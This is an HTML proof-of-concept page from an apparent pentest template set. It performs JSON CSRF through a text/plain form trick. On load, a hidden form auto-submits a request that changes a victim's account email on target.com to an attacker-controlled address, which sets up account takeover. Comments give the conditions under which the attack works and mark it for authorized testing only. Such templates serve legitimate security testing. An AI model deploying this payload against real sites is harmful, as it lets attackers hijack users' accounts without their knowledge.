<!doctype html>
<!-- JSON CSRF via the text/plain form trick (guide §8/§13). A form can send text/plain, which can be
     valid JSON. Works ONLY IF: session cookie SameSite=None AND the server parses text/plain bodies as JSON.
     First try templates/form_post.html (many "JSON" APIs also accept urlencoded). Authorized testing only. -->
<html><head><meta charset="utf-8"></head>
<body>
<h3>loading…</h3>
<!-- body becomes: {"email":"attacker@my-inbox.example","csrfpad":"=" } -->
<form id="csrf" action="https://target.com/api/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@my-inbox.example","csrfpad":"' value='"}'>
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
